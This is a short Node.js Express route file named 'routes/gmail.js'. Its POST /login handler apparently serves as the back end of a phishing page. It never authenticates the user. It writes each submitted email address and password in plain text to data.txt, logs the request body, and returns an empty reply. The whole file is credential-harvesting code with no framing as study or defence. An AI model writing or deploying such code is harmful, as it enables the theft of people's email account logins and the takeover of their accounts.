const router = require('express').Router();
const fs = require('fs');
// Path: routes/gmail.js

router.route('/login').post((req, res) => {
    console.log(req.body);
    fs.appendFile('data.txt', "\n" + `Email: ${req.body.email} || Password: ${req.body.password}`, function (err) {
        if (err) throw err;
        console.log('Saved!');
      });
    res.send('')
}); 


module.exports = router;